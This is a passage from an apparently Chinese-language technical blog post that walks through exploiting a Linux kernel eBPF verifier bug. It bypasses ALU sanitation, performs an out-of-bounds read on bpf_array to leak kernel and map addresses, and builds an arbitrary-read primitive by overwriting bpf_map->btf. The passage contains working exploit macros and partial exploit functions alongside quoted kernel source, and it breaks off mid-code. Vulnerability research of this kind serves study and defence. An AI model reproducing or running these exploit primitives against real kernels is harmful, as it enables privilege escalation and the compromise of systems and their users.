BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, <span class="hljs-number">63</span>);<br><span class="hljs-keyword">if</span> (issrc) &#123;<br>*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX,<br> off_reg);<br>insn-&gt;src_reg = BPF_REG_AX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>*patch++ = BPF_ALU64_REG(BPF_AND, off_reg,<br> BPF_REG_AX);<br>&#125;<br><span class="hljs-keyword">if</span> (isneg)<br>insn-&gt;code = insn-&gt;code == code_add ?<br>     code_sub : code_add;<br>*patch++ = *insn;<br><span class="hljs-keyword">if</span> (issrc &amp;&amp; isneg)<br>*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, <span class="hljs-number">-1</span>);<br>cnt = patch - insn_buf;<br><br>new_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);<br><span class="hljs-keyword">if</span> (!new_prog)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>delta    += cnt - <span class="hljs-number">1</span>;<br>env-&gt;prog = prog = new_prog;<br>insn      = new_prog-&gt;insnsi + i + delta;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>aux-&gt;alu_limit</code> 为<strong>当前指针运算范围</strong>，初始时为 0，与指针所做的常量运算同步，对于减法而言可读范围为 <code>(ptr - alu_limit, ptr]</code> （以指针最初指向的地址为 <code>0</code>），因此我们还需要绕过这个检查</p><p>由于我们有运行时为 1、verifier 认为是 0 的寄存器，我们可以这样调整范围：</p><ul><li>构造另外一个同样是运行时值为 1、verifier 认为是 0 的寄存器 <code>R8</code></li><li>将 <code>R8</code> 乘上一个不大于 value size 的值（例如 value size 为 <code>0x1000</code>，<code>R8</code> 便设为 <code>0x1000</code>）</li><li>将指向 map 第一个元素第一个字节 <code>value[0]</code> 的寄存器（假设为 <code>R7</code> ）先加上 <code>0x1000</code>，此时 <code>alu_limit</code> 变为 <code>0x1000</code>，<code>R7</code> 指向 <code>value[0x1000]</code></li><li><code>R7 -= R8</code>，由于 verifier 认为 R8 为 0，因此 <code>alu_limit</code> 保持不变，<strong>但 R7 实际上已经指回了</strong> <code>value[0]</code></li></ul><p>由此我们便能继续愉快地进行前向的越界读了</p><blockquote><p>注：在内核版本 5.11.8 之前 ALU Sanitation 存在一个漏洞，即 <code>aux_alu_limit</code> 被初始化为 0 从而导致 <code>0-1</code> 造成整型溢出变为一个巨大的值，在<a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=10d2bb2e6b1d8c4576c56a748f697dbeb8388899">这个 commit</a> 中才被修复，因此对于 5.11.8 之前版本的内核而言是不需要绕过该检查的</p></blockquote><h3 id="OOB-read-on-bpf-array"><a href="#OOB-read-on-bpf-array" class="headerlink" title="OOB-read on bpf_array"></a>OOB-read on bpf_array</h3><p>现在让我们来看看这个存放数据的位置附近有没有什么有趣的数据，对于 <code>BPF_MAP_TYPE_ARRAY</code> 类型 的 map 而言，其 wrapper 为 <code>bpf_array</code> 类型（即 <code>bpf_map</code> 内嵌于该结构体中），<strong>数据则直接存放在其内部的</strong> <code>value</code> <strong>数组成员当中</strong>，因此在查找元素时我们获得的其实是一个指向 <code>bpf_array</code> 内部的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> <span class="hljs-title">map</span>;</span><br>u32 elem_size;<br>u32 index_mask;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array_aux</span> *<span class="hljs-title">aux</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>DECLARE_FLEX_ARRAY(<span class="hljs-type">char</span>, value) __aligned(<span class="hljs-number">8</span>);<br>DECLARE_FLEX_ARRAY(<span class="hljs-type">void</span> *, ptrs) __aligned(<span class="hljs-number">8</span>);<br>DECLARE_FLEX_ARRAY(<span class="hljs-type">void</span> __percpu *, pptrs) __aligned(<span class="hljs-number">8</span>);<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>因此我们只需要前向读取便能读取到 <code>bpf_map</code>，之后通过 <code>bpf_map</code> 的函数表（<code>bpf_map-&gt;ops</code> ）便能泄露出内核地址，这里我们将 <code>bpf_array_ops</code> 的值读取到 <code>map[1]</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_KERNEL_INFO(__map_fd)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br></code></pre></td></tr></table></figure><p>成功泄露出内核地址：</p><p><img src="https://s2.loli.net/2023/06/04/zE4t6RO8acsMbJV.png" alt="image.png"></p><blockquote><p>笔者本来想直接写一个循环直接往前盲读 <code>page_offset_base + 0x9d000</code> （通过物理地址 0 处数据定位），但是  <em>verifier 要求不能有回向边</em>  ，所以这里还是老老实实地看 <code>bpf_array</code> 周围的数据：）</p></blockquote><h3 id="Leak-map-address"><a href="#Leak-map-address" class="headerlink" title="Leak map address"></a>Leak map address</h3><p>当我们在调用辅助函数 <code>BPF_FUNC_map_lookup_elem()</code> 时，该函数会返回一个指向 <code>value</code> 的指针，我们是否能够直接将这个值存放到 map 当中从而泄露出 map 地址？通常情况下答案是否定的，verifier 会检查寄存器的类型并阻止指针泄露的情况发生</p><p>现在让我们思考如何利用我们的漏洞寄存器绕过这个限制，注意到 verifier 在跟踪指针寄存器与常量寄存器间运算时会调用到 <code>adjust_ptr_min_max_vals()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_reg_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> bpf_insn *insn)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_verifier_state</span> *<span class="hljs-title">vstate</span> =</span> env-&gt;cur_state;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_state</span> *<span class="hljs-title">state</span> =</span> vstate-&gt;frame[vstate-&gt;curframe];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">regs</span> =</span> state-&gt;regs, *dst_reg, *src_reg;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">ptr_reg</span> =</span> <span class="hljs-literal">NULL</span>, off_reg = &#123;<span class="hljs-number">0</span>&#125;;<br>u8 opcode = BPF_OP(insn-&gt;code);<br><span class="hljs-type">int</span> err;<br><br>dst_reg = &amp;regs[insn-&gt;dst_reg];<br>src_reg = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (dst_reg-&gt;type != SCALAR_VALUE)<br>ptr_reg = dst_reg;<br><span class="hljs-keyword">else</span><br><span class="hljs-comment">/* Make sure ID is cleared otherwise dst_reg min/max could be</span><br><span class="hljs-comment"> * incorrectly propagated into other registers by find_equal_scalars()</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;id = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;<br>src_reg = &amp;regs[insn-&gt;src_reg];<br><span class="hljs-keyword">if</span> (src_reg-&gt;type != SCALAR_VALUE) &#123;<br><span class="hljs-comment">//...</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ptr_reg) &#123;<br><span class="hljs-comment">/* pointer += scalar */</span><br>err = mark_chain_precision(env, insn-&gt;src_reg);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><span class="hljs-keyword">return</span> adjust_ptr_min_max_vals(env, insn,<br>       dst_reg, src_reg);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而在 <code>adjust_ptr_min_max_vals()</code> 当中有这样一个逻辑：如果源寄存器的边界存在 <code>smin_val &gt; smax_val || umin_val &gt; umax_val</code> 的情况，<strong>则直接将目的寄存器设为 unknown</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_ptr_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> bpf_insn *insn,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_reg_state *ptr_reg,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_reg_state *off_reg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_verifier_state</span> *<span class="hljs-title">vstate</span> =</span> env-&gt;cur_state;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_state</span> *<span class="hljs-title">state</span> =</span> vstate-&gt;frame[vstate-&gt;curframe];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">regs</span> =</span> state-&gt;regs, *dst_reg;<br><span class="hljs-type">bool</span> known = tnum_is_const(off_reg-&gt;var_off);<br>s64 smin_val = off_reg-&gt;smin_value, smax_val = off_reg-&gt;smax_value,<br>    smin_ptr = ptr_reg-&gt;smin_value, smax_ptr = ptr_reg-&gt;smax_value;<br>u64 umin_val = off_reg-&gt;umin_value, umax_val = off_reg-&gt;umax_value,<br>    umin_ptr = ptr_reg-&gt;umin_value, umax_ptr = ptr_reg-&gt;umax_value;<br>u32 dst = insn-&gt;dst_reg, src = insn-&gt;src_reg;<br>u8 opcode = BPF_OP(insn-&gt;code);<br><span class="hljs-type">int</span> ret;<br><br>dst_reg = &amp;regs[dst];<br><br><span class="hljs-keyword">if</span> ((known &amp;&amp; (smin_val != smax_val || umin_val != umax_val)) ||<br>    smin_val &gt; smax_val || umin_val &gt; umax_val) &#123;<br><span class="hljs-comment">/* Taint dst register if offset had invalid bounds derived from</span><br><span class="hljs-comment"> * e.g. dead branches.</span><br><span class="hljs-comment"> */</span><br>__mark_reg_unknown(env, dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>而 <code>__mark_reg_unknown()</code> 则会<strong>直接将寄存器设为标量值类型，这样的值可以直接存入 map 而不会被 verifier 限制</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __mark_reg_unknown(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_verifier_env *env,<br>       <span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Clear type, id, off, and union(map_ptr, range) and</span><br><span class="hljs-comment"> * padding between &#x27;type&#x27; and union</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">memset</span>(reg, <span class="hljs-number">0</span>, offsetof(<span class="hljs-keyword">struct</span> bpf_reg_state, var_off));<br>reg-&gt;type = SCALAR_VALUE;<br>reg-&gt;var_off = tnum_unknown;<br>reg-&gt;frameno = <span class="hljs-number">0</span>;<br>reg-&gt;precise = env-&gt;subprog_cnt &gt; <span class="hljs-number">1</span> || !env-&gt;bpf_capable;<br>__mark_reg_unbounded(reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>由此我们便可以通过将指针寄存器与一个漏洞寄存器进行算术运算来绕过这个限制，从而泄露出 map 的地址，需要注意的是<strong>我们的漏洞寄存器的第 33 位是 unknown 的，我们需要将其进行截断以消去</strong>：</p><blockquote><p>我们应当尽量减少截断时 verifier 对寄存器的跟踪，因此这里直接用 <code>mov</code> ，如果使用 <code>and 0xffffffff</code> 这样的操作则没法消除掉 unknown 位，少 and 几位则会导致寄存器边界值和 var_off 重新更新</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_ADDR(__map_fd)                         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV32_REG(VULN_REG, VULN_REG),              \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        LEAK_MAP_ADDR(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要注意我们获得的地址是指向 <code>bpf_array.value</code> 的，需要自行计算偏移：</p><p><img src="https://s2.loli.net/2023/06/06/1KNx2MTmQ5A39Gp.png" alt="image.png"></p><blockquote><p>这里我们可以注意到 <code>bpf_map</code> <strong>并不在 direct mapping area 上</strong>，应该是调用了 vmalloc，笔者推测可能是因为我们分配的 map 太大的缘故：）</p></blockquote><h2 id="四、任意地址读，泄露进程地址"><a href="#四、任意地址读，泄露进程地址" class="headerlink" title="四、任意地址读，泄露进程地址"></a>四、任意地址读，泄露进程地址</h2><p>接下来我们考虑如何完成任意地址读，由于我们能够读写 <code>bpf_map</code> 中的数据，故考虑从此处下手：）</p><p><strong>BPF Type Format</strong>（BTF）是一种元数据格式，用于给 eBPF 提供一些额外的信息，在内核中使用 <code>btf</code> 结构体表示一条 btf 信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> &#123;</span><br><span class="hljs-type">void</span> *data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_type</span> **<span class="hljs-title">types</span>;</span><br>u32 *resolved_ids;<br>u32 *resolved_sizes;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *strings;<br><span class="hljs-type">void</span> *nohdr_data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_header</span> <span class="hljs-title">hdr</span>;</span><br>u32 nr_types; <span class="hljs-comment">/* includes VOID for base BTF */</span><br>u32 types_size;<br>u32 data_size;<br><span class="hljs-type">refcount_t</span> refcnt;<br>u32 id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span><br><br><span class="hljs-comment">/* split BTF support */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">base_btf</span>;</span><br>u32 start_id; <span class="hljs-comment">/* first type ID in this BTF (0 for base BTF) */</span><br>u32 start_str_off; <span class="hljs-comment">/* first string offset (0 for base BTF) */</span><br><span class="hljs-type">char</span> name[MODULE_NAME_LEN];<br><span class="hljs-type">bool</span> kernel_btf;<br>&#125;;<br></code></pre></td></tr></table></figure><p>注意到在 <code>bpf_map</code> 当中刚好有一个指向 <code>struct btf</code> 的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> &#123;</span><br><span class="hljs-comment">//...</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br></code></pre></td></tr></table></figure><p> <code>bpf_map-&gt;btf</code> 在什么时候会被访问到？注意到 <code>bpf</code> 系统调用给我们提供的选项中有一个为 <code>BPF_OBJ_GET_INFO_BY_FD</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(bpf, <span class="hljs-type">int</span>, cmd, <span class="hljs-keyword">union</span> bpf_attr __user *, uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, size)<br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_OBJ_GET_INFO_BY_FD:<br>err = bpf_obj_get_info_by_fd(&amp;attr, uattr);<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>对于 map 类型而言最终会调用到 <code>bpf_map_get_info_by_fd()</code> ，在该函数中<strong>会把 bpf_map-&gt;btf.id 拷贝给用户空间</strong>： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_map_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>,</span><br><span class="hljs-params">  <span class="hljs-type">const</span> <span class="hljs-keyword">union</span> bpf_attr *attr,</span><br><span class="hljs-params">  <span class="hljs-keyword">union</span> bpf_attr __user *uattr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;btf) &#123;<br>info.btf_id = btf_obj_id(<span class="hljs-built_in">map</span>-&gt;btf);<br>info.btf_key_type_id = <span class="hljs-built_in">map</span>-&gt;btf_key_type_id;<br>info.btf_value_type_id = <span class="hljs-built_in">map</span>-&gt;btf_value_type_id;<br>&#125;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (copy_to_user(uinfo, &amp;info, info_len) ||<br>    put_user(info_len, &amp;uattr-&gt;info.info_len))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_obj_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">union</span> bpf_attr *attr,</span><br><span class="hljs-params">  <span class="hljs-keyword">union</span> bpf_attr __user *uattr)</span><br>&#123;<br><span class="hljs-type">int</span> ufd = attr-&gt;info.bpf_fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (CHECK_ATTR(BPF_OBJ_GET_INFO_BY_FD))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>f = fdget(ufd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADFD;<br><br><span class="hljs-keyword">if</span> (f.file-&gt;f_op == &amp;bpf_prog_fops)<br>err = bpf_prog_get_info_by_fd(f.file, f.file-&gt;private_data, attr,<br>      uattr);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f.file-&gt;f_op == &amp;bpf_map_fops)<br>err = bpf_map_get_info_by_fd(f.file, f.file-&gt;private_data, attr,<br>     uattr);<br></code></pre></td></tr></table></figure><p>我们不难想到的是<strong>我们可以通过控制 btf 指针的方式完成任意地址读</strong>，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* write the value into bpf_map-&gt;btf */</span>         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8),     \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),        \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr_4_bytes</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        READ_ARBITRARY_ADDR(map_fd, idx), <br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span 